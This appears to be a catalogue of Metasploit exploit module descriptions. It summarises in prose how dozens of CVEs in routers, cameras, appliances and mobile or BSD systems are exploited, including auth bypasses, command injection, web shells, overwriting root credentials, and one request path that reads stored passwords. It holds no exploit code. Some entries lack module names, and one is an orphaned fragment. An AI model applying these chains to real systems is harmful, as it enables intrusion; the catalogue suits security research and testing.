aix/local/xorg_x11_server
WARNING: Successful execution of this module results in /etc/passwd being overwritten. This module is a port of the OpenBSD X11 Xorg exploit to run on AIX. A permission check flaw exists for -modulepath and -logfile options when starting Xorg. This allows unprivileged users that can start the server the ability to elevate privileges and run arbitrary code under root privileges. This module has been tested with AIX 7.1 and 7.2, and should also work with 6.1. Due to permission restrictions of the crontab in AIX, this module does not use cron, and instead overwrites /etc/passwd in order to create a new user with root privileges. All currently logged in users need to be included when /etc/passwd is overwritten, else AIX will throw 'Cannot get "LOGNAME" variable' when attempting to change user. The Xorg '-fp' parameter used in the OpenBSD exploit does not work on AIX, and is replaced by '-config', in conjuction with ANSI-C quotes to inject newlines when overwriting /etc/passwd.

android/browser/stagefright_mp4_tx3g_64bit
This module exploits an integer overflow vulnerability in the Stagefright Library (libstagefright.so). The vulnerability occurs when parsing specially crafted MP4 files. While a wide variety of remote attack vectors exist, this particular exploit is designed to work within an HTML5 compliant browser. Exploitation is done by supplying a specially crafted MP4 file with two tx3g atoms that, when their sizes are summed, cause an integer overflow when processing the second atom. As a result, a temporary buffer is allocated with insufficient size and a memcpy call leads to a heap overflow. This version of the exploit uses a two-stage information leak based on corrupting the MetaData that the browser reads from mediaserver. This method is based on a technique published in NorthBit's Metaphor paper. First, we use a variant of their technique to read the address of a heap buffer located adjacent to a SampleIterator object as the video HTML element's videoHeight. Next, we read the vtable pointer from an empty Vector within the SampleIterator object using the video element's duration. This gives us a code address that we can use to determine the base address of libstagefright and construct a ROP chain dynamically. NOTE: the mediaserver process on many Android devices (Nexus, for example) is constrained by SELinux and thus cannot use the execve system call. To avoid this problem, the original exploit uses a kernel exploit payload that disables SELinux and spawns a shell as root. Work is underway to make the framework more amenable to these types of situations. Until that work is complete, this exploit will only yield a shell on devices without SELinux or with SELinux in permissive mode.

android/browser/webview_addjavascriptinterface
This module exploits a privilege escalation issue in Android < 4.2's WebView component that arises when untrusted Javascript code is executed by a WebView that has one or more Interfaces added to it. The untrusted Javascript code can call into the Java Reflection APIs exposed by the Interface and execute arbitrary commands. Some distributions of the Android Browser app have an addJavascriptInterface call tacked on, and thus are vulnerable to RCE. The Browser app in the Google APIs 4.1.2 release of Android is known to be vulnerable. A secondary attack vector involves the WebViews embedded inside a large number of Android applications. Ad integrations are perhaps the worst offender here. If you can MITM the WebView's HTTP connection, or if you can get a persistent XSS into the page displayed in the WebView, then you can inject the html/js served by this module and get a shell. Note: Adding a .js to the URL will return plain javascript (no HTML markup).

android/local/binder_uaf
This module exploits CVE-2019-2215, which is a use-after-free in Binder in the Android kernel. The bug is a local privilege escalation vulnerability that allows for a full compromise of a vulnerable device. If chained with a browser renderer exploit, this bug could fully compromise a device through a malicious website. The freed memory is replaced with an iovec structure in order to leak a pointer to the task_struct. Finally the bug is triggered again in order to overwrite the addr_limit, making all memory (including kernel memory) accessible as part of the user-space memory range in our process and allowing arbitrary reading and writing of kernel memory.

apple_ios/browser/webkit_createthis
This module exploits a type confusion bug in the Javascript Proxy object in WebKit. The DFG JIT does not take into account that, through the use of a Proxy, it is possible to run arbitrary JS code during the execution of a CreateThis operation. This makes it possible to change the structure of e.g. an argument without causing a bailout, leading to a type confusion (CVE-2018-4233). The type confusion leads to the ability to allocate fake Javascript objects, as well as the ability to find the address in memory of a Javascript object. This allows us to construct a fake JSCell object that can be used to read and write arbitrary memory from Javascript. The module then uses a ROP chain to write the first stage shellcode into executable memory within the Safari process and kick off its execution. The first stage maps the second stage macho (containing CVE-2017-13861) into executable memory, and jumps to its entrypoint. The CVE-2017-13861 async_wake exploit leads to a kernel task port (TFP0) that can read and write arbitrary kernel memory. The processes credential and sandbox structure in the kernel is overwritten and the meterpreter payloads code signature hash is added to the kernels trust cache, allowing Safari to load and execute the (self-signed) meterpreter payload.

freebsd/http/junos_phprc_auto_prepend_file
This module exploits a PHP environment variable manipulation vulnerability affecting Juniper SRX firewalls and EX switches. The affected Juniper devices run FreeBSD and every FreeBSD process can access their stdin by opening /dev/fd/0. The exploit also makes use of two useful PHP features. The first being 'auto_prepend_file' which causes the provided file to be added using the 'require' function. The second PHP function is 'allow_url_include' which allows the use of URL-aware fopen wrappers. By enabling allow_url_include, the exploit can use any protocol wrapper with auto_prepend_file. The module then uses data:// to provide a file inline which includes the base64 encoded PHP payload. By default this exploit returns a session confined to a FreeBSD jail with limited functionality. There is a datastore option 'JAIL_BREAK', that when set to true, will steal the necessary tokens from a user authenticated to the J-Web application, in order to overwrite the the root password hash. If there is no user authenticated to the J-Web application this method will not work. The module then authenticates with the new root password over SSH and then rewrites the original root password hash to /etc/master.passwd.

freebsd/local/intel_sysret_priv_esc
This module exploits a vulnerability in the FreeBSD kernel, when running on 64-bit Intel processors. By design, 64-bit processors following the X86-64 specification will trigger a general protection fault (GPF) when executing a SYSRET instruction with a non-canonical address in the RCX register. However, Intel processors check for a non-canonical address prior to dropping privileges, causing a GPF in privileged mode. As a result, the current userland RSP stack pointer is restored and executed, resulting in privileged code execution. This module has been tested successfully on: FreeBSD 8.3-RELEASE (amd64); and FreeBSD 9.0-RELEASE (amd64).

This exploit overwrites the `ip6po_pktinfo` pointer of a `ip6_pktopts` struct in freed memory to achieve arbitrary kernel read/write. This module has been tested successfully on: FreeBSD 9.0-RELEASE #0 (amd64); FreeBSD 9.1-RELEASE #0 r243825 (amd64); FreeBSD 9.2-RELEASE #0 r255898 (amd64); FreeBSD 9.3-RELEASE #0 r268512 (amd64); FreeBSD 12.0-RELEASE r341666 (amd64); and FreeBSD 12.1-RELEASE r354233 (amd64).

freebsd/webapp/spamtitan_unauth_rce
TitanHQ SpamTitan Gateway is an anti-spam appliance that protects against unwanted emails and malwares. This module exploits an improper input sanitization in versions 7.01, 7.02, 7.03 and 7.07 to inject command directives into the SNMP configuration file and get remote code execution as root. Note that only version 7.03 needs authentication and no authentication is required for versions 7.01, 7.02 and 7.07. First, it sends an HTTP POST request to the `snmp-x.php` page with an `SNMPD` command directives (`extend` + command) passed to the `community` parameter. This payload is then added to `snmpd.conf` by the application. Finally, the module triggers the execution of this command by querying the SNMP server for the correct OID. This exploit module has been successfully tested against versions 7.01, 7.02, 7.03, and 7.07.

linux/fileformat/unrar_cve_2022_30333
This module creates a RAR file that exploits CVE-2022-30333, which is a path-traversal vulnerability in unRAR that can extract an arbitrary file to an arbitrary location on a Linux system. UnRAR fixed this vulnerability in version 6.12 (open source version 6.1.7). The core issue is that when a symbolic link is unRAR'ed, Windows symbolic links are not properly validated on Linux systems and can therefore write a symbolic link that points anywhere on the filesystem. If a second file in the archive has the same name, it will be written to the symbolic link path.

linux/ftp/proftp_sreplace
This module exploits a stack-based buffer overflow in versions 1.2 through 1.3.0 of ProFTPD server. The vulnerability is within the "sreplace" function within the "src/support.c" file. The off-by-one heap overflow bug in the ProFTPD sreplace function has been discovered about 2 (two) years ago by Evgeny Legerov. We tried to exploit this off-by-one bug via MKD command, but failed. We did not work on this bug since then. Actually, there are exists at least two bugs in sreplace function, one is the mentioned off-by-one heap overflow bug the other is a stack-based buffer overflow via 'sstrncpy(dst,src,negative argument)'. We were unable to reach the "sreplace" stack bug on ProFTPD 1.2.10 stable version, but the version 1.3.0rc3 introduced some interesting changes, among them: 1. another (integer) overflow in sreplace! 2. now it is possible to reach sreplace stack-based buffer overflow bug via the "pr_display_file" function! 3. stupid '.message' file display bug So we decided to choose ProFTPD 1.3.0 as a target for our exploit. To reach the bug, you need to upload a specially created .message file to a writeable directory, then do "CWD <writeable directory>" to trigger the invocation of sreplace function. Note that ProFTPD 1.3.0rc3 has introduced a stupid bug: to display '.message' file you also have to upload a file named '250'. ProFTPD 1.3.0 fixes this bug. The exploit is a part of VulnDisco Pack since Dec 2005.

linux/ftp/proftp_telnet_iac
This module exploits a stack-based buffer overflow in versions of ProFTPD server between versions 1.3.2rc3 and 1.3.3b. By sending data containing a large number of Telnet IAC commands, an attacker can corrupt memory and execute arbitrary code. The Debian Squeeze version of the exploit uses a little ROP stub to indirectly transfer the flow of execution to a pool buffer (the cmd_rec "res" in "pr_cmd_read"). The Ubuntu version uses a ROP stager to mmap RWX memory, copy a small stub to it, and execute the stub. The stub then copies the remainder of the payload in and executes it. NOTE: Most Linux distributions either do not ship a vulnerable version of ProFTPD, or they ship a version compiled with stack smashing protection. Although SSP significantly reduces the probability of a single attempt succeeding, it will not prevent exploitation. Since the daemon forks in a default configuration, the cookie value will remain the same despite some attempts failing. By making repeated requests, an attacker can eventually guess the cookie value and exploit the vulnerability. The cookie in Ubuntu has 24-bits of entropy. This reduces the effectiveness and could allow exploitation in semi-reasonable amount of time.

This configuration setting spark.acls.enable should be set true in the Spark configuration to make the application vulnerable for this attack. Apache Spark versions 3.0.3 and earlier, versions 3.1.1 to 3.1.2, and versions 3.2.0 to 3.2.1 are affected by this vulnerability.

linux/http/apache_superset_cookie_sig_rce
Apache Superset versions <= 2.0.0 utilize Flask with a known default secret key which is used to sign HTTP cookies. These cookies can therefore be forged. If a user is able to login to the site, they can decode the cookie, set their user_id to that of an administrator, and re-sign the cookie. This valid cookie can then be used to login as the targeted user. From there the Superset database is mounted, and credentials are pulled. A dashboard is then created. Lastly a pickled python payload can be set for that dashboard within Superset's database which will trigger the RCE. An attempt to clean up ALL of the dashboard key values and reset them to their previous values happens during the cleanup phase.

linux/http/asuswrt_lan_rce
The HTTP server in AsusWRT has a flaw where it allows an unauthenticated client to perform a POST in certain cases. This can be combined with another vulnerability in the VPN configuration upload routine that sets NVRAM configuration variables directly from the POST request to enable a special command mode. This command mode can then be abused by sending a UDP packet to infosvr, which is running on port UDP 9999 to directly execute commands as root. This exploit leverages that to start telnetd in a random port, and then connects to it. It has been tested with the RT-AC68U running AsusWRT Version 3.0.0.4.380.7743.

linux/http/axis_app_install
This module exploits the "Apps" feature in Axis IP cameras. The feature allows third party developers to upload and execute 'eap' applications on the device. The system does not validate the application comes from a trusted source, so a malicious attacker can upload and execute arbitrary code. The issue has no CVE, although the technique was made public in 2018. This module uploads and executes stageless meterpreter as `root`. Uploading the application requires valid credentials. The default administrator credentials used to be `root:root` but newer firmware versions force users to provide a new password for the `root` user. The module was tested on an Axis M3044-V using the latest firmware (9.80.3.8: December 2021). Although all modules that support the "Apps" feature are presumed to be vulnerable.

linux/http/cacti_unauthenticated_cmd_injection
This module exploits an unauthenticated command injection vulnerability in Cacti through 1.2.22 (CVE-2022-46169) in order to achieve unauthenticated remote code execution as the www-data user. The module first attempts to obtain the Cacti version to see if the target is affected. If LOCAL_DATA_ID and/or HOST_ID are not set, the module will try to bruteforce the missing value(s). If a valid combination is found, the module will use these to attempt exploitation. If LOCAL_DATA_ID and/or HOST_ID are both set, the module will immediately attempt exploitation. During exploitation, the module sends a GET request to /remote_agent.php with the action parameter set to polldata and the X-Forwarded-For header set to the provided value for X_FORWARDED_FOR_IP (by default 127.0.0.1). In addition, the poller_id parameter is set to the payload and the host_id and local_data_id parameters are set to the bruteforced or provided values. If X_FORWARDED_FOR_IP is set to an address that is resolvable to a hostname in the poller table, and the local_data_id and host_id values are vulnerable, the payload set for poller_id will be executed by the target. This module has been successfully tested against Cacti version 1.2.22 running on Ubuntu 21.10 (vulhub docker image)

linux/http/cisco_asax_sfr_rce
This module exploits an authenticated command injection vulnerability affecting Cisco ASA-X with FirePOWER Services. This exploit is executed through the ASA's ASDM web server and lands in the FirePower Services SFR module's Linux virtual machine as the root user. Access to the virtual machine allows the attacker to pivot to the inside network, and access the outside network. Also, the SFR virtual machine is running snort on the traffic flowing through the ASA, so the attacker should have access to this diverted traffic as well. This module requires ASDM credentials in order to traverse the ASDM interface. A similar attack can be performed via Cisco CLI (over SSH), although that isn't implemented here. Finally, it's worth noting that this attack bypasses the affects of the `lockdown-sensor` command (e.g. the virtual machine's bash shell shouldn't be available but this attack makes it available). Cisco assigned this issue CVE-2022-20828. The issue affects all Cisco ASA that support the ASA FirePOWER module (at least Cisco ASA-X with FirePOWER Service, and Cisco ISA 3000). The vulnerability has been patched in ASA FirePOWER module versions 6.2.3.19, 6.4.0.15, 6.6.7, and 7.0.21. The following versions will receive no patch: 6.2.2 and earlier, 6.3.*, 6.5.*, and 6.7.*.

This module exploits an authentication bypass (CVE-2021-1472) and command injection (CVE-2021-1473) in the Cisco Small Business RV series of VPN/routers. The device does not adequately verify the credentials in the HTTP Authorization field when requests are made to the /upload endpoint. Then the upload.cgi binary will use the contents of the HTTP Cookie field as part of a `curl` request aimed at an internal endpoint. The curl request is executed using `popen` and allows the attacker to inject commands via the Cookie field. A remote and unauthenticated attacker using this module is able to achieve code execution as `www-data`.

Note that the primary functionality of this module is to leverage the Cloupia script interpreter to execute code. This functionality is part of the application's intended operation and considered a "foreverday." The authentication bypass and directory traversals only get us there. If you already have an API key, you may set it in the API_KEY option. The LEAK_FILE option may be set if you wish to leak the API key from a different absolute path, but normally this isn't advisable. Tested on Cisco's VMware distribution of 6.7.3.0.

linux/http/cisco_ucs_rce
The Cisco UCS Director virtual appliance contains two flaws that can be combined and abused by an attacker to achieve remote code execution as root. The first one, CVE-2019-1937, is an authentication bypass, that allows the attacker to authenticate as an administrator. The second one, CVE-2019-1936, is a command injection in a password change form, that allows the attacker to inject commands that will execute as root. This module combines both vulnerabilities to achieve the unauthenticated command injection as root. It has been tested with Cisco UCS Director virtual machines 6.6.0 and 6.7.0. Note that Cisco also mentions in their advisory that their IMC Supervisor and UCS Director Express are also affected by these vulnerabilities, but this module was not tested with those products.

linux/http/crypttech_cryptolog_login_exec
This module exploits a SQL injection and command injection vulnerability in the PHP version of CryptoLog. An unauthenticated user can execute a terminal command under the context of the web user. These vulnerabilities are no longer present in the ASP.NET version CryptoLog, available since 2009. CryptoLog's login.php endpoint is responsible for the login process. One of the user supplied parameters is used by the application without input validation and parameter binding, which leads to SQL injection vulnerability. Successfully exploiting this vulnerability gives a valid session. CryptoLog's logshares_ajax.php endpoint is responsible for executing an operation system command. It's not possible to access this endpoint without having a valid session. One user parameter is used by the application while executing an operating system command, which causes a command injection issue. Combining these vulnerabilities gives the opportunity execute operation system commands under the context of the web user.

A vulnerability in the web-based management interface of the Cisco RV110W Wireless-N VPN Firewall, Cisco RV130W Wireless-N Multifunction VPN Router, and Cisco RV215W Wireless-N VPN Router could allow an unauthenticated, remote attacker to execute arbitrary code on an affected device. The vulnerability is due to improper validation of user-supplied data in the web-based management interface. An attacker could exploit this vulnerability by sending malicious HTTP requests to a targeted device. A successful exploit could allow the attacker to execute arbitrary code on the underlying operating system of the affected device as a high-privilege user. RV110W Wireless-N VPN Firewall versions prior to 1.2.2.1 are affected. RV130W Wireless-N Multifunction VPN Router versions prior to 1.0.3.45 are affected. RV215W Wireless-N VPN Router versions prior to 1.3.1.1 are affected. Note: successful exploitation may not result in a session, and as such, on_new_session will never repair the HTTP server, leading to a denial-of-service condition.

Utilizing the DCOS Cluster's Marathon UI, an attacker can create a docker container with the '/' path mounted with read/write permissions on the host server that is running the docker container. As the docker container executes command as uid 0 it is honored by the host operating system allowing the attacker to edit/create files owed by root. This exploit abuses this to creates a cron job in the '/etc/cron.d/' path of the host server. *Notes: The docker image must be a valid docker image from hub.docker.com. Furthermore the docker container will only deploy if there are resources available in the DC/OS cluster.

linux/http/dlink_diagnostic_exec_noauth
Some D-Link Routers are vulnerable to OS Command injection in the web interface. On DIR-645 versions prior 1.03 authentication isn't needed to exploit it. On version 1.03 authentication is needed in order to trigger the vulnerability, which has been fixed definitely on version 1.04. Other D-Link products, like DIR-300 rev B and DIR-600, are also affected by this vulnerability. Not every device includes wget which we need for deploying our payload. On such devices you could use the cmd generic payload and try to start telnetd or execute other commands. Since it is a blind OS command injection vulnerability, there is no output for the executed command when using the cmd generic payload. A ping command against a controlled system could be used for testing purposes. This module has been tested successfully on DIR-645 prior to 1.03, where authentication isn't needed in order to exploit the vulnerability.

Several Dlink routers contain a pre-authentication stack buffer overflow vulnerability, which is exposed on the LAN interface on port 80. This vulnerability affects the HNAP SOAP protocol, which accepts arbitrarily long strings into certain XML parameters and then copies them into the stack. This exploit has been tested on the real devices DIR-818LW and 868L (rev. B), and it was tested using emulation on the DIR-822, 823, 880, 885, 890 and 895. Others might be affected, and this vulnerability is present in both MIPS and ARM devices. The MIPS devices are powered by Lextra RLX processors, which are crippled MIPS cores lacking a few load and store instructions. Because of this the payloads have to be sent unencoded, which can cause them to fail, although the bind shell seems to work well. For the ARM devices, the inline reverse tcp seems to work best.

linux/http/efw_chpasswd_exec
This module exploits an OS command injection vulnerability in a web-accessible CGI script used to change passwords for locally-defined proxy user accounts. Valid credentials for such an account are required. Command execution will be in the context of the "nobody" account, but this account had broad sudo permissions, including to run the script /usr/local/bin/chrootpasswd (which changes the password for the Linux root account on the system to the value specified by console input once it is executed). The password for the proxy user account specified will *not* be changed by the use of this module, as long as the target system is vulnerable to the exploit. Very early versions of Endian Firewall (e.g. 1.1 RC5) require HTTP basic auth credentials as well to exploit this vulnerability. Use the USERNAME and PASSWORD advanced options to specify these values if required. Versions >= 3.0.0 still contain the vulnerable code, but it appears to never be executed due to a bug in the vulnerable CGI script which also prevents normal use (http://jira.endian.com/browse/UTM-1002). Versions 2.3.x and 2.4.0 are not vulnerable because of a similar bug (http://bugs.endian.com/print_bug_page.php?bug_id=3083).

This module exploits multiple vulnerabilities in EyesOfNetwork version 5.1, 5.2 and 5.3 in order to execute arbitrary commands as root. This module takes advantage of a command injection vulnerability in the `target` parameter of the AutoDiscovery functionality within the EON web interface in order to write an Nmap NSE script containing the payload to disk. It then starts an Nmap scan to activate the payload. This results in privilege escalation because the`apache` user can execute Nmap as root. Valid credentials for a user with administrative privileges are required. However, this module can bypass authentication via various methods, depending on the EON version. EON 5.3 is vulnerable to a hardcoded API key and two SQL injection exploits. EON 5.1 and 5.2 can only be exploited via SQL injection. This module has been successfully tested on EyesOfNetwork 5.1, 5.2 and 5.3.

This module exploits a cross-site request forgery (CSRF) vulnerability in F5 Big-IP's iControl interface to write an arbitrary file to the filesystem. While any file can be written to any location as root, the exploitability is limited by SELinux; the vast majority of writable locations are unavailable. By default, we write to a script that executes at reboot, which means the payload will execute the next time the server boots. An alternate target - Login - will add a backdoor that executes next time a user logs in interactively. This overwrites a file, but we restore it when we get a session Note that because this is a CSRF vulnerability, it starts a web server, but an authenticated administrator must visit the site, which redirects them to the target.

linux/http/huawei_hg532n_cmdinject
This module exploits a command injection vulnerability in the Huawei HG532n routers provided by TE-Data Egypt, leading to a root shell. The router's web interface has two kinds of logins, a "limited" user:user login given to all customers and an admin mode. The limited mode is used here to expose the router's telnet port to the outside world through NAT port-forwarding. With telnet now remotely accessible, the router's limited "ATP command line tool" (served over telnet) can be upgraded to a root shell through an injection into the ATP's hidden "ping" command.

linux/http/ibm_drm_rce
IBM Data Risk Manager (IDRM) contains three vulnerabilities that can be chained by an unauthenticated attacker to achieve remote code execution as root. The first is an unauthenticated bypass, followed by a command injection as the server user, and finally abuse of an insecure default password. This module exploits all three vulnerabilities, giving the attacker a root shell. At the time of disclosure this was an 0day, but it was later confirmed and patched by IBM. The authentication bypass works on versions <= 2.0.6.1, but the command injection should only work on versions <= 2.0.4 according to IBM.

linux/http/ibm_qradar_unauth_rce
IBM QRadar SIEM has three vulnerabilities in the Forensics web application that when chained together allow an attacker to achieve unauthenticated remote code execution. The first stage bypasses authentication by fixating session cookies. The second stage uses those authenticated sessions cookies to write a file to disk and execute that file as the "nobody" user. The third and final stage occurs when the file executed as "nobody" writes an entry into the database that causes QRadar to execute a shell script controlled by the attacker as root within the next minute. Details about these vulnerabilities can be found in the advisories listed in References. The Forensics web application is disabled in QRadar Community Edition, but the code still works, so these vulnerabilities can be exploited in all flavours of QRadar. This module was tested with IBM QRadar CE 7.3.0 and 7.3.1. IBM has confirmed versions up to 7.2.8 patch 12 and 7.3.1 patch 3 are vulnerable. Due to payload constraints, this module only runs a generic/shell_reverse_tcp payload.

linux/http/kaltura_unserialize_cookie_rce
This module exploits an Object Injection vulnerability in Kaltura. By exploiting this vulnerability, unauthenticated users can execute arbitrary code under the context of the web server user. Kaltura makes use of a hardcoded cookie secret which allows to sign arbitrary cookie data. After passing this signature check, the base64- decoded data is passed to PHPs unserialize() function which allows for code execution. The constructed object is again based on the SektionEins Zend code execution POP chain PoC. Kaltura versions prior to 13.1.0 are affected by this issue. A valid entry_id (which is required for this exploit) can be obtained from any media resource published on the kaltura installation. This module was tested against Kaltura 13.1.0-2 installed on Ubuntu 14.04.

linux/http/kibana_timelion_prototype_pollution_rce
Kibana versions before 5.6.15 and 6.6.1 contain an arbitrary code execution flaw in the Timelion visualizer. An attacker with access to the Timelion application could send a request that will attempt to execute javascript code. This leads to an arbitrary command execution with permissions of the Kibana process on the host system. Exploitation will require a service or system reboot to restore normal operation. The WFSDELAY parameter is crucial for this exploit. Setting it too high will cause MANY shells (50-100+), while setting it too low will cause no shells to be obtained. WFSDELAY of 10 for a docker image caused 6 shells. Tested against kibana 6.5.4.

linux/http/kibana_upgrade_assistant_telemetry_rce
Kibana before version 7.6.3 suffers from a prototype pollution bug within the Upgrade Assistant. By setting a new constructor.prototype.sourceURL value we're able to execute arbitrary code. Code execution is possible through two different ways. Either by sending data directly to Elastic, or using Kibana to submit the same queries. Either method enters the polluted prototype for Kibana to read. Kibana will either need to be restarted, or collection happens (unknown time) for the payload to execute. Once it does, cleanup must delete the .kibana_1 index for Kibana to restart successfully. Once a callback does occur, cleanup will happen allowing Kibana to be successfully restarted on next attempt.

If no Admin user is created the endpoint `/cgi-bin/fax_change_faxtrace_settings` is accessible without authentication. The endpoint allows the user to configure a number of different fax settings. A number of the configurable parameters on the page (ex. `FT_Custom_lbtrace`) fail to be sanitized properly before being used in an bash eval statement: `eval "$cmd" > /dev/null`, allowing for an unauthenticated user to run arbitrary commands.

An authenticated user can execute an operating system command under the context of the web server user which is root. /admin/managetracing/search/search endpoint takes several user inputs and then pass them to the internal service which is responsible for executing operating system command. One of the user input is being passed to the service without proper validation. That cause a command injection vulnerability.

linux/http/metabase_setup_token_rce
Metabase versions before 0.46.6.1 contain a flaw where the secret setup-token is accessible even after the setup process has been completed. With this token a user is able to submit the setup functionality to create a new database. When creating a new database, an H2 database string is created with a TRIGGER that allows for code execution. We use a sample database for our connection string to prevent corrupting real databases. Successfully tested against Metabase 0.46.6.

linux/http/nagios_xi_autodiscovery_webshell
This module exploits a path traversal issue in Nagios XI before version 5.8.5 (CVE-2021-37343). The path traversal allows a remote and authenticated administrator to upload a PHP web shell and execute code as `www-data`. The module achieves this by creating an autodiscovery job with an `id` field containing a path traversal to a writable and remotely accessible directory, and `custom_ports` field containing the web shell. A cron file will be created using the chosen path and file name, and the web shell is embedded in the file. After the web shell has been written to the victim, this module will then use the web shell to establish a Meterpreter session or a reverse shell. By default, the web shell is deleted by the module, and the autodiscovery job is removed as well.

linux/http/nagios_xi_plugins_check_plugin_authenticated_rce
This module exploits a vulnerability in the getprofile.sh script of Nagios XI prior to 5.6.6 in order to upload a malicious check_ping plugin and thereby execute arbitrary commands. For Nagios XI 5.2.0-5.4.13, the commands are run as the nagios user. For versions 5.5.0-5.6.5 the commands are run as root. Note that versions prior to 5.2.0 will still be marked as being vulnerable however this module does not presently support exploiting these targets. The module uploads a malicious check_ping plugin to the Nagios XI server via /admin/monitoringplugins.php and then executes this plugin by issuing a HTTP GET request to download a system profile from the server. For all supported targets except Linux (cmd), the module uses a command stager to write the exploit to the target via the malicious plugin. This may not work if Nagios XI is running in a restricted Unix environment, so in that case the target must be set to Linux (cmd). The module then writes the payload to the malicious plugin while avoiding commands that may not be supported. Valid credentials for a user with administrative privileges are required. This module was successfully tested on Nagios XI 5.3.0 and Nagios 5.6.5, both running on CentOS 7. For vulnerable versions before 5.5.0, it may take a significant amount of time for the payload to get back (up to 5 minutes). If exploitation fails against an older system, it is recommended to increase the WfsDelay setting (default is 300 seconds). See the documentation for more information.

The NETGEAR WNR2000 router has a stack buffer overflow vulnerability in the hidden_lang_avi parameter. In order to exploit it, it is necessary to guess the value of a certain timestamp which is in the configuration of the router. An authenticated attacker can simply fetch this from a page, but an unauthenticated attacker has to brute force it. Brute forcing the timestamp token might take a few minutes, a few hours, or days, but it is guaranteed that it can be bruteforced. This module implements both modes, and it works very reliably. It has been tested with the WNR2000v5, firmware versions 1.0.0.34 and 1.0.0.18. It should also work with hardware revisions v4 and v3, but this has not been tested - with these routers it might be necessary to adjust the LibcBase variable as well as the gadget addresses.

linux/http/pandora_fms_events_exec
This module exploits a vulnerability (CVE-2020-13851) in Pandora FMS versions 7.0 NG 742, 7.0 NG 743, and 7.0 NG 744 (and perhaps older versions) in order to execute arbitrary commands. This module takes advantage of a command injection vulnerability in the `Events` feature of Pandora FMS. This flaw allows users to execute arbitrary commands via the `target` parameter in HTTP POST requests to the `Events` function. After authenticating to the target, the module attempts to exploit this flaw by issuing such an HTTP POST request, with the `target` parameter set to contain the payload. If a shell is obtained, the module will try to obtain the local MySQL database password via a simple `grep` command on the plaintext `/var/www/html/pandora_console/include/config.php` file. Valid credentials for a Pandora FMS account are required. The account does not need to have admin privileges. This module has been successfully tested on Pandora 7.0 NG 744 running on CentOS 7 (the official virtual appliance ISO for this version).

linux/http/saltstack_salt_wheel_async_rce
This module leverages an authentication bypass and directory traversal vulnerabilities in Saltstack Salt's REST API to execute commands remotely on the `master` as the root user. Every 60 seconds, `salt-master` service performs a maintenance process check that reloads and executes all the `grains` on the `master`, including custom grain modules in the Extension Module directory. So, this module simply creates a Python script at this location and waits for it to be executed. The time interval is set to 60 seconds by default but can be changed in the `master` configuration file with the `loop_interval` option. Note that, if an administrator executes commands locally on the `master`, the maintenance process check will also be performed. It has been fixed in the following installation packages: 3002.5, 3001.6 and 3000.8. Also, a patch is available for the following versions: 3002.2, 3001.4, 3000.6, 2019.2.8, 2019.2.5, 2018.3.5, 2017.7.8, 2016.11.10, 2016.11.6, 2016.11.5, 2016.11.3, 2016.3.8, 2016.3.6, 2016.3.4, 2015.8.13 and 2015.8.10. This module has been tested successfully against versions 3001.4, 3002 and 3002.2 on Ubuntu 18.04.

linux/http/samsung_srv_1670d_upload_exec
This module exploits an unrestricted file upload vulnerability in Web Viewer 1.0.0.193 on Samsung SRN-1670D devices. The network_ssl_upload.php file allows remote authenticated attackers to upload and execute arbitrary PHP code via a filename with a .php extension, which is then accessed via a direct request to the file in the upload/ directory. To authenticate for this attack, one can obtain web-interface credentials in cleartext by leveraging the existing local file read vulnerability referenced by CVE-2015-8279, which allows remote attackers to read the web interface credentials by sending a request to: cslog_export.php?path=/root/php_modules/lighttpd/sbin/userpw URI.

linux/http/sophos_wpa_iface_exec
This module takes advantage of two vulnerabilities in order to gain remote code execution as root as an otherwise non-privileged authorized user. By taking advantage of a mass assignment vulnerability that allows an unprivileged authenticated user to change the administrator's password hash, the module updates the password to login as the admin to reach the second vulnerability. No server-side sanitization is done on values passed when configuring a static network interface. This allows an administrator user to run arbitrary commands in the context of the web application, which is root when configuring the network interface. This module will inadvertently delete any other users that may have been present as a side effect of changing the admin's password.

linux/http/symantec_messaging_gateway_exec
This module exploits the command injection vulnerability of Symantec Messaging Gateway product. An authenticated user can execute a terminal command under the context of the web server user which is root. backupNow.do endpoint takes several user inputs and then pass them to the internal service which is responsible for executing operating system command. One of the user input is being passed to the service without proper validation. That cause a command injection vulnerability. But given parameters, such a SSH ip address, port and credentials are validated before executing terminal command. Thus, you need to configure your own SSH service and set the required parameter during module usage. This module was tested against Symantec Messaging Gateway 10.6.2-7.

The vulnerability is located in webman/modules/StorageManager/smart.cgi, which allows appending of a command to the device to be scanned. However, the command with drive is limited to 30 characters. A somewhat valid drive name is required, thus /dev/sd is used, even though it doesn't exist. To circumvent the character restriction, a wget input file is staged in /a, and executed to download our payload to /b. From there the payload is executed. A wfsdelay is required to give time for the payload to download, and the execution of it to run.

linux/http/tp_link_ncxxx_bonjour_command_injection
TP-Link cloud cameras NCXXX series (NC200, NC210, NC220, NC230, NC250, NC260, NC450) are vulnerable to an authenticated command injection. In all devices except NC210, despite a check on the name length in swSystemSetProductAliasCheck, no other checks are in place in order to prevent shell metacharacters from being introduced. The system name would then be used in swBonjourStartHTTP as part of a shell command where arbitrary commands could be injected and executed as root. NC210 devices cannot be exploited directly via /setsysname.cgi due to proper input validation. NC210 devices are still vulnerable since swBonjourStartHTTP did not perform any validation when reading the alias name from the configuration file. The configuration file can be written, and code execution can be achieved by combining this issue with CVE-2020-12110.

linux/http/wd_mycloud_multiupload_upload
This module exploits a file upload vulnerability found in Western Digital's MyCloud NAS web administration HTTP service. The /web/jquery/uploader/multi_uploadify.php PHP script provides multipart upload functionality that is accessible without authentication and can be used to place a file anywhere on the device's file system. This allows an attacker the ability to upload a PHP shell onto the device and obtain arbitrary code execution as root.

linux/http/wd_mycloud_unauthenticated_cmd_injection
This module exploits authentication bypass (CVE-2018-17153) and command injection (CVE-2016-10108) vulnerabilities in Western Digital MyCloud before 2.30.196 in order to achieve unauthenticated remote code execution as the root user. The module first performs a check to see if the target is WD MyCloud. If so, it attempts to trigger an authentication bypass (CVE-2018-17153) via a crafted GET request to /cgi-bin/network_mgr.cgi. If the server responds as expected, the module assesses the vulnerability status by attempting to exploit a commend injection vulnerability (CVE-2016-10108) in order to print a random string via the echo command. This is done via a crafted POST request to /web/google_analytics.php. If the server is vulnerable, the same command injection vector is leveraged to execute the payload. This module has been successfully tested against Western Digital MyCloud version 2.30.183. Note: based on the available disclosures, it seems that the command injection vector (CVE-2016-10108) might be exploitable without the authentication bypass (CVE-2018-17153) on versions before 2.21.126. The obtained results on 2.30.183 imply that the patch for CVE-2016-10108 did not actually remove the command injection vector, but only prevented unauthenticated access to it.

